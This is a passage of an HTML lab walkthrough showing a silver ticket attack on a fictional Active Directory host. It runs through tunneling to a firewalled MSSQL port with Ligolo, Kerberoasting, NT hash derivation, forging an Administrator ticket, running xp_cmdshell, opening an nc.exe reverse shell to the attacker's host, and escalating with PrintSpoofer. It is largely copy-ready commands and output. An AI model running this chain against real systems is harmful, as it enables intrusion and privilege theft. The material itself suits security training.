    <article>

      <!-- ======================================================= -->
      <h2 id="intro"><span class="num">01.</span> Introduction</h2>

      <p>Silver ticket attacks allow attackers to access services as another user, even when they do not have that user's credentials, as long as they have the correct credentials for the target service. However, these services may be inaccessible to the attacker due to a firewall.</p>

      <blockquote>
        <p>All hostnames, domains, usernames, credentials, hashes, SIDs, and IP addresses in this guide are fictional and used only to demonstrate the technique on a generic lab environment.</p>
      </blockquote>

      <!-- ======================================================= -->
      <h2 id="scenario"><span class="num">02.</span> Scenario &amp; Setup</h2>

      <h3 id="current-scenario">Current Scenario</h3>
      <p>We are working through a generic Active Directory lab machine. In order to achieve privilege escalation, we have WinRM access as a low-privileged user. This account can transfer files, execute basic commands, and run executables. In order to elevate our privileges, we must access port 1433 from the attacker machine and run commands as the Administrator user. However, we do not have credentials for the Administrator, but we do have the credentials for <code>svc_mssql</code>, which we harvested and cracked via Kerberoasting.</p>

      <h3 id="initial-setup">Initial Setup</h3>
      <p>Two sets of credentials, neither of which grants admin privilege:</p>
      <ul>
        <li><strong>john.smith</strong> — a low-privileged user, able to execute commands via WinRM and upload files.</li>
        <li><strong>svc_mssql</strong> — a service account that was kerberoasted and cracked offline. It issues tickets for anyone who tries to use Microsoft SQL Server.</li>
      </ul>

      <h3 id="objective">The Objective</h3>
      <p>Access port 1433 of the target machine from the attacker machine as the Administrator user, which allows us to execute commands on the host.</p>

      <h3 id="problems">The Problems</h3>
      <ul>
        <li>Port 1433 is only accessible locally, which means the attacker machine cannot interact with it directly.</li>
        <li>We do not have Administrator's credentials.</li>
      </ul>

      <h3 id="workaround">The Workaround</h3>
      <ul>
        <li>By using Ligolo, we are able to interact with ports that are only accessible via localhost.</li>
        <li>We can perform a silver ticket attack in order to forge tickets as Administrator and use them.</li>
      </ul>

      <!-- ======================================================= -->
      <h2 id="tunnel"><span class="num">03.</span> Step 1: Communicate with Port 1433 via Tunneling</h2>

      <h3 id="winrm">1.1 Access via WinRM</h3>

      <div class="cb" data-host="attacker">
        <div class="cb-head">
          <span class="cb-host"><span class="ico">⌬</span><span class="hw">attacker</span><span class="hwo">@kali</span></span>
          <span class="cb-lang">bash · evil-winrm</span>
          <button class="copy" data-idx="0">cp</button>
        </div>
        <pre><span class="prm">┌──(kali㉿kali)-[~/Documents/lab]
└─$</span> <span class="cmd">evil-winrm</span> <span class="flag">-i</span> <span class="arg">10.10.10.20</span> <span class="flag">-u</span> <span class="str">'JOHN.SMITH'</span> <span class="flag">-p</span> <span class="str">'Winter2024!'</span>

<span class="out">Evil-WinRM shell v3.9
Info: Establishing connection to remote endpoint</span></pre>
      </div>

      <figure>
        <div class="ph"><span class="ph-label"><span class="ph-gl">▸</span> screenshot · evil-winrm session established</span></div>
        <figcaption><span class="fig-lbl">FIG 01</span><span class="fig-alt">WinRM session as john.smith on 10.10.10.20 — low-privileged foothold.</span></figcaption>
      </figure>

      <h3 id="reaching-1433">Reaching Port 1433</h3>
      <p>Confirm port 1433 is listening locally on the target:</p>

      <div class="cb" data-host="target-win">
        <div class="cb-head">
          <span class="cb-host"><span class="ico">⊟</span><span class="hw">target</span><span class="hwo">win · winrm</span></span>
          <span class="cb-lang">powershell · netstat</span>
          <button class="copy" data-idx="1">cp</button>
        </div>
        <pre><span class="prm">*Evil-WinRM* PS C:\Users\john.smith\Documents&gt;</span> <span class="cmd">netstat -ano</span>

<span class="out">Active Connections

  Proto  Local Address          Foreign Address        State           PID
  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:88             0.0.0.0:0              LISTENING       644
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       900
  TCP    0.0.0.0:389            0.0.0.0:0              LISTENING       644
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:1433           0.0.0.0:0              LISTENING       2200</span></pre>
      </div>

      <blockquote>
        <p>Despite being bound to 0.0.0.0, the computer's firewall actively blocks the port from external connections.</p>
      </blockquote>

      <h3 id="ligolo-setup">1.2 Setting Up the Ligolo Network Interface</h3>
      <p>Create the TUN interface for Ligolo on the attacker machine:</p>

      <div class="cb" data-host="attacker">
        <div class="cb-head">
          <span class="cb-host"><span class="ico">⌬</span><span class="hw">attacker</span><span class="hwo">@kali</span></span>
          <span class="cb-lang">bash · tun setup</span>
          <button class="copy" data-idx="2">cp</button>
        </div>
        <pre><span class="prm">┌──(kali㉿kali)-[~/Documents/lab]
└─$</span> <span class="cmd">sudo ip tuntap add user</span> <span class="var">$(whoami)</span> <span class="cmd">mode tun ligolo</span>
<span class="prm">└─$</span> <span class="cmd">sudo ip link set ligolo up</span>
<span class="prm">└─$</span> <span class="cmd">sudo ligolo-proxy -selfcert</span></pre>
      </div>

      <p>These commands create the network interface and start the Ligolo proxy, which will listen for the agent connection.</p>

      <figure>
        <div class="ph"><span class="ph-label"><span class="ph-gl">▸</span> screenshot · ligolo-proxy listening, waiting for agent</span></div>
        <figcaption><span class="fig-lbl">FIG 02</span><span class="fig-alt">ligolo-proxy started with self-signed cert, listening on :11601.</span></figcaption>
      </figure>

      <p>Host the agent binary with a Python HTTP server, then download and execute it from the WinRM session:</p>

      <div class="cb" data-host="attacker">
        <div class="cb-head">
          <span class="cb-host"><span class="ico">⌬</span><span class="hw">attacker</span><span class="hwo">@kali</span></span>
          <span class="cb-lang">bash · serve agent</span>
          <button class="copy" data-idx="3">cp</button>
        </div>
        <pre><span class="prm">┌──(kali㉿kali)-[~/Documents/lab]
└─$</span> <span class="cmd">python3 -m http.server</span>
<span class="out">Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...</span></pre>
      </div>

      <div class="cb" data-host="target-win">
        <div class="cb-head">
          <span class="cb-host"><span class="ico">⊟</span><span class="hw">target</span><span class="hwo">win · winrm</span></span>
          <span class="cb-lang">powershell · download agent</span>
          <button class="copy" data-idx="4">cp</button>
        </div>
        <pre><span class="prm">*Evil-WinRM* PS C:\temp&gt;</span> <span class="cmd">cmd /c curl</span> <span class="flag">-O</span> <span class="arg">http://10.10.14.5:8000/agent.exe</span></pre>
      </div>

      <div class="cb" data-host="target-win">
        <div class="cb-head">
          <span class="cb-host"><span class="ico">⊟</span><span class="hw">target</span><span class="hwo">win · winrm</span></span>
          <span class="cb-lang">powershell · run agent</span>
          <button class="copy" data-idx="5">cp</button>
        </div>
        <pre><span class="prm">*Evil-WinRM* PS C:\temp&gt;</span> <span class="cmd">cmd /c agent.exe</span> <span class="flag">-connect</span> <span class="arg">10.10.14.5:11601</span> <span class="flag">-ignore-cert</span>
<span class="out">time="2026-05-14T06:32:30-07:00" level=warning msg="warning, certificate validation disabled"
time="2026-05-14T06:32:30-07:00" level=info msg="Connection established" addr="10.10.14.5:11601"</span></pre>
      </div>

      <p>On the Ligolo console, attach to the session and start the relay:</p>

      <div class="cb" data-host="ligolo">
        <div class="cb-head">
          <span class="cb-host"><span class="ico">⇋</span><span class="hw">ligolo-ng</span><span class="hwo">proxy console</span></span>
          <span class="cb-lang">tunnel control</span>
          <button class="copy" data-idx="6">cp</button>
        </div>
        <pre><span class="out">ligolo-ng » INFO[0330] Agent joined. name="CORP\john.smith@srv01" remote="10.10.10.20:50118"
ligolo-ng »</span> <span class="cmd">session</span>
<span class="out">? Specify a session : 1 - CORP\john.smith@srv01 - 10.10.10.20:49952 - 00505686048f
ligolo-ng »</span> <span class="cmd">start</span></pre>
      </div>

      <figure>
        <div class="ph"><span class="ph-label"><span class="ph-gl">▸</span> screenshot · agent connection received in ligolo console</span></div>
        <figcaption><span class="fig-lbl">FIG 03</span><span class="fig-alt">Agent joined confirmation and session started in the Ligolo-ng proxy console.</span></figcaption>
      </figure>

      <p>Add a route for the magic CIDR — <code>240.0.0.1</code> maps to the loopback of the target machine:</p>

      <div class="cb" data-host="attacker">
        <div class="cb-head">
          <span class="cb-host"><span class="ico">⌬</span><span class="hw">attacker</span><span class="hwo">linux terminal</span></span>
          <span class="cb-lang">bash · route via tunnel</span>
          <button class="copy" data-idx="7">cp</button>
        </div>
        <pre><span class="prm">┌──(kali㉿kali)-[~/Documents/lab]
└─$</span> <span class="cmd">sudo ip route add</span> <span class="num">240.0.0.1/32</span> <span class="flag">dev</span> <span class="arg">ligolo</span></pre>
      </div>

      <figure>
        <div class="ph"><span class="ph-label"><span class="ph-gl">▸</span> screenshot · ping 240.0.0.1 showing loopback is reachable</span></div>
        <figcaption><span class="fig-lbl">FIG 04</span><span class="fig-alt">Pinging 240.0.0.1 succeeds — loopback services on the target are now reachable from the attacker machine.</span></figcaption>
      </figure>

      <h3 id="access-1433">Access Port 1433 (MSSQL)</h3>
      <p>With the tunnel active, connect to MSSQL through the magic CIDR using the <code>svc_mssql</code> credentials:</p>

      <div class="cb" data-host="attacker">
        <div class="cb-head">
          <span class="cb-host"><span class="ico">⌬</span><span class="hw">attacker</span><span class="hwo">→ 240.0.0.1:1433</span></span>
          <span class="cb-lang">bash · mssql via tunnel</span>
          <button class="copy" data-idx="8">cp</button>
        </div>
        <pre><span class="prm">┌──(kali㉿kali)-[~/Documents/lab]
└─$</span> <span class="cmd">impacket-mssqlclient</span> <span class="arg">svc_mssql:Passw0rd123!@240.0.0.1</span> <span class="flag">-windows-auth</span>
<span class="out">Impacket v0.14.0.dev0 - Copyright Fortra, LLC

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] INFO(srv01\SQLEXPRESS): Line 1: Changed database context to 'master'.</span></pre>
      </div>

      <figure>
        <div class="ph"><span class="ph-label"><span class="ph-gl">▸</span> screenshot · mssqlclient connected as svc_mssql</span></div>
        <figcaption><span class="fig-lbl">FIG 05</span><span class="fig-alt">First problem solved: port 1433 is reachable through the tunnel. We can authenticate as svc_mssql — but not yet as Administrator.</span></figcaption>
      </figure>

      <p>The first problem is solved: we can interact with port 1433 as <code>svc_mssql</code>. However, we still need to access it as the Administrator user in order to run commands such as <code>xp_cmdshell</code>.</p>

      <blockquote>
        <p>Note: this lab uses the SPN format <code>MSSQL/...</code> rather than the usual <code>MSSQLSvc/host:port</code> convention.</p>
      </blockquote>

      <!-- ======================================================= -->
      <h2 id="silver"><span class="num">04.</span> Silver Ticket Attack</h2>

      <h3 id="get-spn">Get the SPN</h3>
      <p>This is the same command used to obtain the <code>svc_mssql</code> hash earlier. It also shows the SPN (Service Principal Name), which is required to forge the ticket. The SPN can also be seen in BloodHound.</p>

      <div class="cb" data-host="attacker">
        <div class="cb-head">
          <span class="cb-host"><span class="ico">⌬</span><span class="hw">attacker</span><span class="hwo">→ dc01</span></span>
          <span class="cb-lang">bash · GetUserSPNs</span>
          <button class="copy" data-idx="9">cp</button>
        </div>
        <pre><span class="prm">┌──(kali㉿kali)-[~/Documents/lab]
└─$</span> <span class="cmd">impacket-GetUserSPNs</span> <span class="str">"corp.local"/"john.smith":"Winter2024!"</span> <span class="flag">-dc-ip</span> <span class="arg">10.10.10.10</span> <span class="flag">-request -outputfile</span> <span class="arg">hashes.kerberoasting</span>
<span class="out">
ServicePrincipalName    Name       MemberOf  PasswordLastSet              LastLogon
----------------------  ---------  --------  ---------------------------  ---------------------------
MSSQL/srv01.corp.local  svc_mssql            2023-04-30 03:45:33.288595   2024-08-03 13:48:01.815298</span></pre>
      </div>

      <h3 id="get-sid">Get the Domain SID</h3>

      <div class="cb" data-host="attacker">
        <div class="cb-head">
          <span class="cb-host"><span class="ico">⌬</span><span class="hw">attacker</span><span class="hwo">→ 240.0.0.1</span></span>
          <span class="cb-lang">bash · lookupsid</span>
          <button class="copy" data-idx="10">cp</button>
        </div>
        <pre><span class="prm">┌──(kali㉿kali)-[~/Documents/lab]
└─$</span> <span class="cmd">impacket-lookupsid</span> <span class="str">'corp.local'/'svc_mssql':'Passw0rd123!'</span><span class="arg">@240.0.0.1</span>
<span class="out">Impacket v0.14.0.dev0 - Copyright Fortra, LLC

[*] Brute forcing SIDs at 240.0.0.1
[*] StringBinding ncacn_np:240.0.0.1[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-1111111111-2222222222-3333333333</span></pre>
      </div>

      <figure>
        <div class="ph"><span class="ph-label"><span class="ph-gl">▸</span> screenshot · lookupsid output showing domain SID</span></div>
        <figcaption><span class="fig-lbl">FIG 06</span><span class="fig-alt">Domain SID retrieved via the Ligolo tunnel using svc_mssql credentials.</span></figcaption>
      </figure>

      <h3 id="hosts">Edit <code>/etc/hosts</code></h3>
      <p>Replace the current IP with <code>240.0.0.1</code> and add the KDC hostname (<code>srv01.corp.local</code>) obtained from <code>GetUserSPNs</code>.</p>

      <div class="cb" data-host="local">
        <div class="cb-head">
          <span class="cb-host"><span class="ico">▢</span><span class="hw">attacker</span><span class="hwo">/etc/hosts</span></span>
          <span class="cb-lang">hosts · before → after</span>
          <button class="copy" data-idx="11">cp</button>
        </div>
        <pre><span class="out cmt"># before</span>
<span class="num">10.10.10.20</span>  <span class="arg">corp.local</span>

<span class="out cmt"># after</span>
<span class="num">240.0.0.1</span>    <span class="arg">srv01.corp.local</span> <span class="arg">corp.local</span></pre>
      </div>

      <h3 id="ntlm-hash">Getting the NTLM Hash from svc_mssql</h3>
      <p>Since we have the <code>svc_mssql</code> credential, we can turn it into an NTLM hash, which is required to generate the silver ticket:</p>

      <div class="cb" data-host="local">
        <div class="cb-head">
          <span class="cb-host"><span class="ico">▢</span><span class="hw">local</span><span class="hwo">offline · no network</span></span>
          <span class="cb-lang">bash · compute nt hash</span>
          <button class="copy" data-idx="12">cp</button>
        </div>
        <pre><span class="prm">┌──(kali㉿kali)-[~/Documents/lab]
└─$</span> <span class="var">NT</span>=<span class="var">$(</span><span class="cmd">echo</span> <span class="flag">-n</span> <span class="str">'Passw0rd123!'</span> | <span class="cmd">iconv</span> <span class="flag">-t</span> <span class="arg">utf-16le</span> | <span class="cmd">openssl dgst</span> <span class="flag">-md4 -r</span> | <span class="cmd">awk</span> <span class="str">'&#123;print $1&#125;'</span><span class="var">)</span>

<span class="prm">└─$</span> <span class="cmd">echo</span> <span class="var">$NT</span>
<span class="out">ab4f5a5c42df5a0ee337d12ce77332f5</span></pre>
      </div>

      <figure>
        <div class="ph"><span class="ph-label"><span class="ph-gl">▸</span> screenshot · NT hash derivation from plaintext password</span></div>
        <figcaption><span class="fig-lbl">FIG 07</span><span class="fig-alt">NTLM hash computed offline from the cracked svc_mssql password using openssl MD4.</span></figcaption>
      </figure>

      <h3 id="ticketer">Acquiring the Ticket for the Administrator User</h3>

      <div class="cb" data-host="local">
        <div class="cb-head">
          <span class="cb-host"><span class="ico">▢</span><span class="hw">local</span><span class="hwo">offline · forge</span></span>
          <span class="cb-lang">bash · impacket-ticketer</span>
          <button class="copy" data-idx="13">cp</button>
        </div>
        <pre><span class="prm">┌──(kali㉿kali)-[~/Documents/lab]
└─$</span> <span class="cmd">impacket-ticketer</span> <span class="arg">Administrator</span> \
    <span class="flag">-spn</span> <span class="str">"MSSQL/srv01.corp.local"</span> \
    <span class="flag">-domain</span> <span class="str">'corp.local'</span> \
    <span class="flag">-domain-sid</span> <span class="str">'S-1-5-21-1111111111-2222222222-3333333333'</span> \
    <span class="flag">-nthash</span> <span class="str">"ab4f5a5c42df5a0ee337d12ce77332f5"</span>
<span class="out">Impacket v0.14.0.dev0 - Copyright Fortra, LLC

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for corp.local/Administrator
[*]     PAC_LOGON_INFO
[*]     PAC_CLIENT_INFO_TYPE
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Signing/Encrypting final ticket
[*]     PAC_SERVER_CHECKSUM
[*]     PAC_PRIVSVR_CHECKSUM
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Saving ticket in Administrator.ccache</span></pre>
      </div>

      <blockquote>
        <p>The SPN, domain SID, and NT hash were all acquired by the previous commands. Because we are forging with <code>-nthash</code>, the ticket is RC4-encrypted; if the service enforced AES, we would need <code>-aesKey</code> instead.</p>
      </blockquote>

      <figure>
        <div class="ph"><span class="ph-label"><span class="ph-gl">▸</span> screenshot · ticketer output, Administrator.ccache created</span></div>
        <figcaption><span class="fig-lbl">FIG 08</span><span class="fig-alt">Silver ticket forged successfully — Administrator.ccache written to the current directory.</span></figcaption>
      </figure>

      <div class="cb" data-host="attacker">
        <div class="cb-head">
          <span class="cb-host"><span class="ico">⌬</span><span class="hw">attacker</span><span class="hwo">env</span></span>
          <span class="cb-lang">bash · load ticket</span>
          <button class="copy" data-idx="14">cp</button>
        </div>
        <pre><span class="prm">└─$</span> <span class="cmd">export</span> <span class="var">KRB5CCNAME</span>=<span class="var">$(</span><span class="cmd">pwd</span><span class="var">)</span>/<span class="arg">Administrator.ccache</span></pre>
      </div>

      <h3 id="krb5">Setting Up krb5 to Use Tickets</h3>

      <div class="cb" data-host="attacker">
        <div class="cb-head">
          <span class="cb-host"><span class="ico">⌬</span><span class="hw">attacker</span><span class="hwo">→ 240.0.0.1</span></span>
          <span class="cb-lang">bash · generate krb5.conf</span>
          <button class="copy" data-idx="15">cp</button>
        </div>
        <pre><span class="prm">┌──(kali㉿kali)-[~/Documents/lab]
└─$</span> <span class="cmd">nxc smb</span> <span class="arg">240.0.0.1</span> <span class="flag">-u</span> <span class="str">'svc_mssql'</span> <span class="flag">-p</span> <span class="str">'Passw0rd123!'</span> <span class="flag">--generate-krb5-file</span> <span class="arg">krb5.conf</span>
<span class="out">SMB  240.0.0.1  445  SRV01  [*] Windows 10 / Server 2019 Build 17763 x64 (domain:corp.local)
SMB  240.0.0.1  445  SRV01  [+] krb5 conf saved to: krb5.conf
SMB  240.0.0.1  445  SRV01  [+] Run: export KRB5_CONFIG=krb5.conf</span>
<span class="prm">└─$</span> <span class="cmd">sudo cp</span> <span class="arg">krb5.conf</span> <span class="arg">/etc/krb5.conf</span></pre>
      </div>

      <p>The <code>krb5.conf</code> file contains the configuration needed to interact with Kerberos, such as the KDC location, realms, and additional settings:</p>

      <div class="cb" data-host="attacker">
        <div class="cb-head">
          <span class="cb-host"><span class="ico">⌬</span><span class="hw">attacker</span><span class="hwo">/etc/krb5.conf</span></span>
          <span class="cb-lang">config · realm definition</span>
          <button class="copy" data-idx="16">cp</button>
        </div>
        <pre><span class="out">$ cat /etc/krb5.conf
[libdefaults]
    dns_lookup_kdc = false
    dns_lookup_realm = false
    default_realm = CORP.LOCAL

[realms]
    CORP.LOCAL = &#123;
        kdc = srv01.corp.local
        admin_server = srv01.corp.local
        default_domain = corp.local
    &#125;

[domain_realm]
    .corp.local = CORP.LOCAL
    corp.local = CORP.LOCAL</span></pre>
      </div>

      <figure>
        <div class="ph"><span class="ph-label"><span class="ph-gl">▸</span> screenshot · krb5.conf content showing realm config</span></div>
        <figcaption><span class="fig-lbl">FIG 09</span><span class="fig-alt">Generated krb5.conf mapping CORP.LOCAL realm to the KDC at srv01.corp.local (which resolves to 240.0.0.1 via /etc/hosts).</span></figcaption>
      </figure>

      <h3 id="klist">Checking That the Ticket Is in Memory</h3>

      <div class="cb" data-host="attacker">
        <div class="cb-head">
          <span class="cb-host"><span class="ico">⌬</span><span class="hw">attacker</span><span class="hwo">env</span></span>
          <span class="cb-lang">bash · klist</span>
          <button class="copy" data-idx="17">cp</button>
        </div>
        <pre><span class="prm">┌──(kali㉿kali)-[~/Documents/lab]
└─$</span> <span class="cmd">klist</span>
<span class="out">Ticket cache: FILE:/home/kali/Documents/lab/Administrator.ccache
Default principal: Administrator@CORP.LOCAL

Valid starting       Expires              Service principal
05/14/2026 09:45:39  05/11/2036 09:45:39  MSSQL/srv01.corp.local@CORP.LOCAL
        renew until 05/11/2036 09:45:39</span></pre>
      </div>

      <figure>
        <div class="ph"><span class="ph-label"><span class="ph-gl">▸</span> screenshot · klist showing Administrator ticket loaded</span></div>
        <figcaption><span class="fig-lbl">FIG 10</span><span class="fig-alt">Ticket is loaded and ready — valid for MSSQL/srv01.corp.local@CORP.LOCAL as Administrator.</span></figcaption>
      </figure>

      <!-- ======================================================= -->
      <h2 id="shell"><span class="num">05.</span> Getting a Shell</h2>

      <div class="cb" data-host="attacker">
        <div class="cb-head">
          <span class="cb-host"><span class="ico">⌬</span><span class="hw">attacker</span><span class="hwo">→ mssql · kerberos</span></span>
          <span class="cb-lang">bash · authenticate with forged tgs</span>
          <button class="copy" data-idx="18">cp</button>
        </div>
        <pre><span class="prm">┌──(kali㉿kali)-[~/Documents/lab]
└─$</span> <span class="cmd">impacket-mssqlclient</span> <span class="flag">-k</span> <span class="flag">-no-pass</span> <span class="arg">Administrator@srv01.corp.local</span>
<span class="out">Impacket v0.14.0.dev0 - Copyright Fortra, LLC

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] INFO(srv01\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] ACK: Result: 1 - Microsoft SQL Server 2022 RTM (16.0.1000)
[!] Press help for extra shell commands
SQL (CORP\Administrator  dbo@master)&gt;</span></pre>
      </div>

      <p>We have successfully logged in as Administrator on MSSQL. Now we are able to execute commands:</p>

      <div class="cb" data-host="sql">
        <div class="cb-head">
          <span class="cb-host"><span class="ico">⊞</span><span class="hw">mssql</span><span class="hwo">as Administrator (forged)</span></span>
          <span class="cb-lang">sql · enable and run xp_cmdshell</span>
          <button class="copy" data-idx="19">cp</button>
        </div>
        <pre><span class="prm">SQL (CORP\Administrator  dbo@master)&gt;</span> <span class="kw">enable_xp_cmdshell</span>
<span class="out">INFO(srv01\SQLEXPRESS): Line 196: Configuration option 'xp_cmdshell' changed from 1 to 1.</span>

<span class="prm">SQL (CORP\Administrator  dbo@master)&gt;</span> <span class="kw">xp_cmdshell</span> <span class="str">"cd C:\temp &amp;&amp; dir"</span>
<span class="out">output
---------------------------------------------------------
 Directory of C:\Temp

05/14/2026  06:30 AM     7,302,656 agent.exe
05/14/2026  06:59 AM        59,392 nc.exe
05/14/2026  06:58 AM        27,136 PrintSpoofer64.exe</span></pre>
      </div>

      <p>We can use our previous Evil-WinRM session to upload PrintSpoofer and nc.exe. Now spawn the reverse shell:</p>

      <div class="cb" data-host="sql">
        <div class="cb-head">
          <span class="cb-host"><span class="ico">⊞</span><span class="hw">mssql</span><span class="hwo">→ reverse shell</span></span>
          <span class="cb-lang">sql · nc callback</span>
          <button class="copy" data-idx="20">cp</button>
        </div>
        <pre><span class="prm">SQL (CORP\Administrator  dbo@master)&gt;</span> <span class="kw">xp_cmdshell</span> <span class="str">"C:\temp\nc.exe 10.10.14.5 4445 -e cmd"</span></pre>
      </div>

      <figure>
        <div class="ph"><span class="ph-label"><span class="ph-gl">▸</span> screenshot · xp_cmdshell executing nc.exe reverse shell</span></div>
        <figcaption><span class="fig-lbl">FIG 11</span><span class="fig-alt">nc.exe launched via xp_cmdshell, dialing back to attacker on port 4445.</span></figcaption>
      </figure>

      <h3 id="new-session">Creating a New Session</h3>

      <div class="cb" data-host="attacker">
        <div class="cb-head">
          <span class="cb-host"><span class="ico">⌬</span><span class="hw">attacker</span><span class="hwo">listener</span></span>
          <span class="cb-lang">bash · catch the shell</span>
          <button class="copy" data-idx="21">cp</button>
        </div>
        <pre><span class="prm">┌──(kali㉿kali)-[~/Documents/lab]
└─$</span> <span class="cmd">rlwrap -cAr nc -lvnp 4445</span>
<span class="out">listening on [any] 4445 ...
connect to [10.10.14.5] from (UNKNOWN) [10.10.10.20] 50335
Microsoft Windows [Version 10.0.17763.4252]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32&gt; whoami
corp\svc_mssql</span></pre>
      </div>

      <!-- ======================================================= -->
      <h2 id="why"><span class="num">06.</span> Why Aren't We <code>NT AUTHORITY\SYSTEM</code>?</h2>

      <p>To run <code>xp_cmdshell</code> at all, we had to forge the Administrator silver ticket; a low-privileged user would not have the rights to enable and run <code>xp_cmdshell</code>. However, <code>xp_cmdshell</code> does not run commands as the SQL login you authenticated with; it runs them under the account the MSSQL service itself runs as, which here is <code>svc_mssql</code>. That is why the shell comes back as <code>svc_mssql</code> rather than <code>Administrator</code>.</p>

      <p>We are still not <code>NT AUTHORITY\SYSTEM</code> either, but that does not matter, because service accounts like this one carry high privileges (notably <code>SeImpersonatePrivilege</code>) that let us escalate the rest of the way.</p>

      <!-- ======================================================= -->
      <h2 id="privesc"><span class="num">07.</span> Privilege Escalation</h2>

      <div class="cb" data-host="target-win">
        <div class="cb-head">
          <span class="cb-host"><span class="ico">⊟</span><span class="hw">reverse shell</span><span class="hwo">as svc_mssql</span></span>
          <span class="cb-lang">cmd · check privileges</span>
          <button class="copy" data-idx="22">cp</button>
        </div>
        <pre><span class="prm">C:\Windows\system32&gt;</span> <span class="cmd">whoami /priv</span>
<span class="out">
PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeMachineAccountPrivilege     Add workstations to domain                Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeManageVolumePrivilege       Perform volume maintenance tasks          Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled</span></pre>
      </div>

      <p>We have <code>SeImpersonatePrivilege</code> — which means we can escalate our privileges even further using PrintSpoofer:</p>

      <div class="cb" data-host="target-win">
        <div class="cb-head">
          <span class="cb-host"><span class="ico">⊟</span><span class="hw">reverse shell</span><span class="hwo">svc_mssql → srv01$</span></span>
          <span class="cb-lang">cmd · PrintSpoofer</span>
          <button class="copy" data-idx="23">cp</button>
        </div>
        <pre><span class="prm">C:\Temp&gt;</span> <span class="cmd">PrintSpoofer64.exe</span> <span class="flag">-i</span> <span class="flag">-c</span> <span class="arg">cmd</span>
<span class="out">[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
Microsoft Windows [Version 10.0.17763.4252]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32&gt; whoami
corp\srv01$</span></pre>
      </div>

      <h3 id="checking-privs">Checking Privileges</h3>

      <div class="cb" data-host="target-win">
        <div class="cb-head">
          <span class="cb-host"><span class="ico">⊟</span><span class="hw">target</span><span class="hwo">as srv01$ (machine account)</span></span>
          <span class="cb-lang">cmd · full privilege set</span>
          <button class="copy" data-idx="24">cp</button>
        </div>
        <pre><span class="prm">C:\Windows\system32&gt;</span> <span class="cmd">whoami /priv</span>
<span class="out">
PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                        State
========================================= ================================================== =======
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                 Enabled
SeMachineAccountPrivilege                 Add workstations to domain                         Enabled
SeSecurityPrivilege                       Manage auditing and security log                   Enabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects           Enabled
SeLoadDriverPrivilege                     Load and unload device drivers                     Enabled
